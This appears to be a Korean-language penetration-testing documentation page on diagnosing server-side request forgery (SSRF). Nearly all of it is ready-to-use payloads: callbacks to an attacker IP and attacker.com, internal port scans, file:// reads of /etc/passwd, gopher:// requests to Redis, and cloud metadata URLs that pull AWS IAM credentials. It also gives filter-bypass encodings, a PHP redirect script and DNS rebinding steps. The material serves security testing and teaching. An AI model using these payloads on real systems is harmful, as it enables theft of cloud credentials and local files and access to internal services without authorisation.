---
sidebar_position: 5
title: Server-Side Request Forgery (SSRF)
---

# Server-Side Request Forgery (SSRF) 취약점 진단

## Overview

**SSRF (Server-Side Request Forgery)**: 공격자가 웹 애플리케이션 서버를 조종하여(위조된 요청을 만들어) 내부 네트워크나 외부 임의의 서버로 HTTP/다양한 프로토콜 요청을 보내게 만드는 취약점

- **위험성**: 방화벽을 우회하여 내부 서비스 접근, 클라우드 메타데이터 탈취, 로컬 파일 읽기 가능

---

## 1. Reconnaissance (취약점 식별)

### 기본 페이로드 테스트
URL 파라미터나 외부 리소스를 가져오는 기능에 공격자 서버 URL 삽입 후 요청 여부 모니터링
```http
http://<target>/page?url=http://<attacker-ip>
http://<target>/fetch?url=http://<attacker-ip>
http://<target>/item/2?server=http://<attacker-ip>
```

### 내부 네트워크 포트 스캔
서버를 프록시로 사용하여 내부(Localhost) 서비스 동작 여부 탐지
```http
http://<target>/fetch?url=http://127.0.0.1:22     # SSH
http://<target>/fetch?url=http://127.0.0.1:80     # HTTP
http://<target>/fetch?url=http://127.0.0.1:3306   # MySQL
http://<target>/fetch?url=http://127.0.0.1:6379   # Redis
```

---

## 2. Exploitation (공격 수행)

### 로컬 파일 및 서비스 접근 (다양한 프로토콜 활용)
HTTP 외의 프로토콜 스키마를 사용하여 서버 로컬 자원에 접근
```http
# [file://] 로컬 파일 시스템 읽기
http://<target>/fetch?url=file:///etc/passwd
http://<target>/fetch?url=file:///c:/windows/win.ini

# [dict://] 내장 서비스(Memcached 등) 정보 추출
http://<target>/fetch?url=dict://127.0.0.1:11211/stats

# [gopher://] Redis 등 내부 서비스 RCE 연계
http://<target>/fetch?url=gopher://127.0.0.1:6379/_SET%20test%20value

# [ldap://] LDAP 서비스 접근
http://<target>/fetch?url=ldap://127.0.0.1:389
```

### 클라우드 메타데이터 자격증명 탈취
타겟 서버가 클라우드 인스턴스인 경우 메타데이터 서비스에 접근하여 토큰 탈취
```http
# AWS (Amazon Web Services)
http://<target>/fetch?url=http://169.254.169.254/latest/meta-data/
http://<target>/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Google Cloud
http://<target>/fetch?url=http://metadata.google.internal/computeMetadata/v1/

# Azure
http://<target>/fetch?url=http://169.254.169.254/metadata/instance?api-version=2021-02-01
```

---

## 3. Advanced Techniques

### SSRF 블랙리스트 필터링 우회 기법
`127.0.0.1`이나 `localhost` 문자열이 필터링된 경우 우회

```http
# 1. IP 주소 형식 변환
http://2130706433/          # 10진수 표현 (127.0.0.1)
http://0177.0.0.1/          # 8진수 혼합
http://0x7f.0x0.0x0.0x1/    # 16진수 표현

# 2. 대체 도메인 사용 (127.0.0.1로 해석되는 도메인)
http://localtest.me/
http://127.0.0.1.nip.io/
http://127.0.0.1.xip.io/

# 3. 특수 문자 조합 (@, #)
http://evil.com@127.0.0.1/
http://127.0.0.1#evil.com/

# 4. 이중 URL 인코딩
http://%25%33%31%25%33%32%25%33%37%2e%25%33%30%2e%25%33%30%2e%25%33%31/
```

### 리다이렉트 (Redirect) 우회 및 DNS Rebinding
서버가 최초 요청 대상만 검증하고 리다이렉션을 따라가는 약점 악용

**HTTP Redirect 활용:**
```php
# 공격자 서버에 redirect.php 구성
<?php header("Location: http://127.0.0.1/admin"); ?>

# 페이로드 주입
http://<target>/fetch?url=http://<attacker-ip>/redirect.php
```

**DNS Rebinding:**
```text
# 1차 검증 시 정상 IP 응답, 검증 직후 내부망 IP로 DNS 응답 변경 (TTL 0 설정)
1차 요청 (검증): attacker.com -> 8.8.8.8 (통과)
2차 요청 (연결): attacker.com -> 127.0.0.1 (공격 성공)
```

### Blind SSRF 식별
화면에 응답값이 노출되지 않는 환경에서는 외부로 DNS 조회가 발생하는지 체크
```bash
# Burp Collaborator 또는 공격자 서버를 이용해 핑백(Pingback) 대기
http://<target>/fetch?url=http://ssrf-test.attacker.com/
```
